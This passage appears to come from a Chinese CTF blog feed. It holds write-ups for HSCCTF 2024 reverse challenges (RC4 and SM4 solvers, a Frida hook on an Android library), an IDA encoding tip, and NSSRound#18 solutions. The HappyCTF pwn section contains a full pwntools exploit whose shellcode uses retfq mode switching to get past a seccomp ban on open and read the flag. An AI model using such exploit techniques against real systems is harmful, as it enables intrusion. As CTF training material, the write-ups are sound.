class="code"><pre><code class="hljs dust"><span class="language-xml">HSCCTF</span><span class="hljs-template-variable">&#123;H31L0_My_FR13ND!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="the-wolf-song"><a href="#the-wolf-song" class="headerlink" title="the_wolf_song"></a>the_wolf_song</h2><p>能识别但用不上</p><img src="/2024/03/10/HSCCTF2024/1710042320322-4ed576c7-5a94-4cb2-bf45-50ffa76d82a9.png" class="" title="img"><p>调试过掉前面的音乐</p><img src="/2024/03/10/HSCCTF2024/1710054119801-e25294b2-b516-4e4a-873c-b812f5d83c02.png" class="" title="img"><p>rc4算法，第一个内存会被初始化</p><img src="/2024/03/10/HSCCTF2024/1710054235494-d36be0da-eac4-4265-9a1c-75e7b59a40fc.png" class="" title="img"><p>流程在代码的第一行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#^6 -&gt; ^3 -&gt; rc4:HSCCTF&#123;FAKE_FLAG!&#125; -&gt; ^j -&gt; ^fake_flag[i] ^fake_flag[i+1] -&gt; ^j</span><br>fake_flag=<span class="hljs-string">&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span><br>enc=[<span class="hljs-number">0xce</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xb4</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0x68</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(enc))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     enc[i]^=i</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_flag)-<span class="hljs-number">1</span>):<br>    enc[i]^=<span class="hljs-built_in">ord</span>(fake_flag[i+<span class="hljs-number">1</span>])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_flag)):<br>    enc[i]^=<span class="hljs-built_in">ord</span>(fake_flag[i])<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     enc[i]^=i</span><br><br>key=<span class="hljs-built_in">bytes</span>(fake_flag.encode())<br>decrypted = rc4(enc, key)<br><span class="hljs-comment">#print(decrypted)</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>    flag+=<span class="hljs-built_in">chr</span>(decrypted[i]^<span class="hljs-number">3</span>^<span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag)<br>HSCCTF&#123;Welcome_To_Participate_In_HSCCTF&#125;<br></code></pre></td></tr></table></figure><h2 id="Android-1"><a href="#Android-1" class="headerlink" title="Android-1"></a>Android-1</h2><p>复现来自yuro✌</p><img src="/2024/03/10/HSCCTF2024/1710057980233-dcb6dd18-2c42-474d-90c4-def9b46433e5-17102079978971.png" class="" title="img"><p>找到关键函数，murmur3_32 哈希算法，得到一个 32 字节的哈希，作为 key  </p><img src="/2024/03/10/HSCCTF2024/1710058239980-9f7b6594-99ca-4cf5-a0f6-aef795cbbdb7-17102079978983.png" class="" title="img"><p>sm4竟然插件没识别出来？看常数就可以发现</p><img src="/2024/03/10/HSCCTF2024/1710058389286-a856058d-c969-42f7-9b0d-228886c4e399-17102079978985.png" class="" title="img"><p>同一插件ida7.7就能识别</p><img src="/2024/03/10/HSCCTF2024/1710161320739-5f24379d-4131-48ff-8bf3-15d19f64e002.png" class="" title="img"><p>hook _Z10murmur3_32PKcjj函数 得到返回值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> func_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libmidand.so&quot;</span> , <span class="hljs-string">&quot;_Z10murmur3_32PKcjj&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;func addr is ---&quot;</span> + func_addr);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(func_addr, &#123;<br>  <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;enter murmur3_32 retvalue-&gt;\n&quot;</span> + <span class="hljs-title function_">hexdump</span>(args));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>我用的是雷电模拟器，前置步骤网上有，也可以看这个</p><p><a href="https://www.yuque.com/u34082223/swqzq3/zdpepl9de1zwz7mw">https://www.yuque.com/u34082223/swqzq3/zdpepl9de1zwz7mw</a></p><p>运行远程frida-server后用<code>frida -U -l 1.js -f MidAnd</code>，一开始找不到MidAnd，用findstr才行</p><img src="/2024/03/10/HSCCTF2024/1710207312322-fcd1a619-46be-447b-a865-602cad21ca7f.png" class="" title="img"><p>一开始一直报错</p><img src="/2024/03/10/HSCCTF2024/1710166946004-61d68afc-f771-4451-b35c-f5215bb59651.png" class="" title="img"><p>在模拟器上输入字符然后点login就好了</p><img src="/2024/03/10/HSCCTF2024/1710207589439-8766b8f9-5ba4-4f91-b2fe-7c9992241683.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1710166891275-3b1302ac-022b-4296-b8c7-b9fdff543fea.png" class="" title="img"><p>再用SM4解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm4<br><br>enc = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;731E133EF76A5CD1EF9626A9947CF4A46CE237B70D4905E921E35E2E7D7A1A74&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">               0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="hljs-string">7f13c97b0d00  c4 83 84 72 b8 e1 60 ba 5d 99 5a 6b e3 67 40 17  ...r..`.].Zk.g@.</span><br><span class="hljs-string">7f13c97b0d10  7c 3f 33 21 91 1c fa 54 8f 35 30 73 dd 2b 80 a7  |?3!...T.50s.+..</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>key1 = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;c4838472b8e160ba5d995a6be3674017&quot;</span>)<br>key2 = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;7c3f3321911cfa548f353073dd2b80a7&quot;</span>)<br><br>s = sm4.CryptSM4(padding_mode=sm4.zero_padding)<br><br>s.set_key(key1, sm4.SM4_DECRYPT) <br>dec = s.crypt_ecb(enc[:<span class="hljs-number">16</span>]) <br><span class="hljs-built_in">print</span>(dec.decode(), end=<span class="hljs-string">&quot;&quot;</span>)<br><br>s.set_key(key2, sm4.SM4_DECRYPT) <br>dec = s.crypt_ecb(enc[<span class="hljs-number">16</span>:]) <br><span class="hljs-built_in">print</span>(dec.decode(), end=<span class="hljs-string">&quot;&quot;</span>)<br>flag&#123;fad1c7e27ec411eebe3a3e4419a1b3cc&#125;  <br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="funny"><a href="#funny" class="headerlink" title="funny"></a>funny</h2><img src="/2024/03/10/HSCCTF2024/1710041422186-08d964df-4990-493b-be7d-25c5069b4332.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>sm4加密</tag>
      
      <tag>blowfish加密</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA显示中文字符</title>
    <link href="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/"/>
    <url>/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<p>之前ida一直不知道如何识别中文字符<img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210011904.png" class="" title="image-20240304210011904"></p><p>在目录后面加参数-dCULTURE&#x3D;all和把编码方式改为gbk都失败了</p><p>后来用学长的ida发现能正常显示中文，查看编码方式原来是gb2312</p><p>于是我在ida8.3里右键插入新的编码方式</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210343584.png" class="" title="image-20240304210343584"><p>然后在ida左下角右键重新分析</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210511607.png" class="" title="image-20240304210511607"><p>再右键rebuild即可</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210546604.png" class="" title="image-20240304210546604">]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSRound#18部分wp</title>
    <link href="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="HappyCTF"><a href="#HappyCTF" class="headerlink" title="HappyCTF"></a>HappyCTF</h2><p>参考链接：<a href="https://xz.aliyun.com/t/6645?time__1311=n4+xnD0DRDBGitN47KDsA3xCqbu75eD9AQ=oD&alichlgref=https://www.baidu.com/link?url=A-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q&wd=&eqid=f2850db1072b3e270000000265cc33af">https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbu75eD9AQ%3DoD&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DA-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q%26wd%3D%26eqid%3Df2850db1072b3e270000000265cc33af</a></p><p>看到rwx基本上是shellcode</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882413729-a8b684db-8573-447e-a278-5447c939771a-170808409444444.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882320571-ffb866fd-3a4b-4970-9dd8-2565512afce9-170808409444446.png" class="" title="img"><p>vuln函数反编译不了，问题不大</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707879608622-3f721439-e2cf-4a39-a7a5-7452e147cf52-170808409444448.png" class="" title="img"><p>敲，后面发现把open给禁了，那得用retfq和retf了</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708081299573-447e5ca9-254f-4562-87cd-130c5e595733.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p = remote(&quot;node1.anna.nssctf.cn&quot;,28592)</span><br>p = process(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4013a0&#x27;)</span><br>sh = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 9 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 7</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 34</span><br><span class="hljs-string">pop r10</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">xor r8,r8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">/read/</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string">push 200</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push rsi</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sd = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp,0x40404040</span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">push 0x00006761</span><br><span class="hljs-string">push 0x6c662f2e</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404062</span><br><span class="hljs-string">retf</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>)<br>sf = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sa(<span class="hljs-string">&quot;:&quot;</span>,sh)<br>pause()<br>sl(sd+sf)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>直接密文去解密不对</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896480014-6513872d-2a7a-4f57-a6b7-27fe2aa5a271.png" class="" title="img"><p>有tls也绕过了（tls不一定能够用上）</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896510027-81ff0497-65d7-4ea5-9c79-fd25036fd396.png" class="" title="img"><p>也没看出有其他的算法</p><p>这种一般都是自己设计的算法，要静下心来看</p><p>发现先十进制转二进制</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050502254-af67ad5d-02e9-4c98-9e25-8a52fa81bd84.png" class="" title="img"><p>经过rc4初始化算法</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050549029-968a083a-1240-484f-b9f2-b86796fdb424.png" class="" title="img"><p>再把二进制转化为十进制作为下标去找对应的值，类似于base64</p><p>这种要通过爆破，首先找密文在table里的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">table = [<br>    <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xC9</span>,<br>    <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD3</span>,<br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xE3</span>,<br>    <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xED</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>,<br>    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xB6</span>,<br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xAE</span><br>]<br><br>enc = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;E2F7D3E2C8B4D8C5CFB4E7EEE1D9F1EFCBEBD9C9CEC5D9E5CCB7D1EDE0B4F1EEE0E7D2F6CBF3C9F3D3D5EF&quot;</span>)<br><span class="hljs-built_in">print</span>(enc)<br>idx = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    idx.append(table.index(i))<span class="hljs-comment">#遍历字节数组enc中的每个元素，使用table.index(i)方法找到该元素在table列表中的索引</span><br><br>s = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> idx:<br>    s.append(<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<span class="hljs-comment">#zfill左侧填充</span><br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0b111111</span>):<br>        c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<br>        l = <span class="hljs-number">0</span><br>        r = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>,<span class="hljs-number">2</span>):<span class="hljs-comment">#i=v3+1=i+1+1</span><br>            l = (k + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            r = (l + r + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            c[l % <span class="hljs-number">6</span>], c[r % <span class="hljs-number">6</span>] = c[r % <span class="hljs-number">6</span>], c[l % <span class="hljs-number">6</span>]<br>        d = <span class="hljs-string">&quot;&quot;</span>.join(c)<br>        <span class="hljs-keyword">if</span> d == i:<br>            res += <span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>            <span class="hljs-keyword">break</span><br><br>b = [res[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(res), <span class="hljs-number">8</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">2</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#NSSCTF&#123;Y0u_4reThe_K1ng_0fBase64&#125;</span><br></code></pre></td></tr></table></figure><h2 id="GenshinWishSimulator"><a href="#GenshinWishSimulator" class="headerlink" title="GenshinWishSimulator"></a>GenshinWishSimulator</h2><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707900162098-9fff77af-2806-41ac-866c-8991156082c7.png" class="" title="img"><p>用dnspy打开，找关键类*Manager</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707901366902-a403543b-7c1e-47b6-ad11-9776325c9cd8.png" class="" title="img"><p>用z3解方程组</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902129974-d2e72bff-cce6-4c4d-affd-f32e5f84bf3f.png" class="" title="img"><p>得到iv</p><img 